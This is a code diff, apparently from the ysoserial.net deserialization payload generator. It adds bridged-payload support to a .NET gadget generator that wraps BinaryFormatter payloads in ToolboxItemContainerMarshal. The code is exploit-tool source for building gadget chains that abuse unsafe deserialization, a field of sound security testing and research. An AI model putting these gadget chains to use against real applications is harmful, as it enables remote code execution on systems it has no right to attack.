@@ -31,15 +31,30 @@ namespace ysoserial.Generators
             return new List<string> { GadgetTypes.BridgeAndDerived };
         }
 
+        public override string SupportedBridgedFormatter()
+        {
+            return Formatters.BinaryFormatter;
+        }
+
         public override object Generate(string formatter, InputArgs inputArgs)
         {
-            byte[] gadget =  (byte[]) SerializeWithNoTest(TextFormattingRunPropertiesGenerator.TextFormattingRunPropertiesGadget(inputArgs), "binaryformatter", inputArgs);
-            string b64encoded = Convert.ToBase64String(gadget);
+            byte[] binaryFormatterPayload;
+            if (BridgedPayload != null)
+            {
+                binaryFormatterPayload = (byte[])BridgedPayload;
+            }
+            else
+            {
+                IGenerator generator = new TextFormattingRunPropertiesGenerator();
+                binaryFormatterPayload = (byte[])SerializeWithNoTest(TextFormattingRunPropertiesGenerator.TextFormattingRunPropertiesGadget(inputArgs), "binaryformatter", inputArgs);
+            }
+
+            string b64encoded = Convert.ToBase64String(binaryFormatterPayload);
 
             if (formatter.Equals("binaryformatter", StringComparison.OrdinalIgnoreCase)
                 || formatter.Equals("losformatter", StringComparison.OrdinalIgnoreCase))
             {
-                var obj = new ToolboxItemContainerMarshal(gadget);
+                var obj = new ToolboxItemContainerMarshal(binaryFormatterPayload);
                 return Serialize(obj, formatter, inputArgs);
             }
             else if (formatter.ToLower().Equals("soapformatter"))
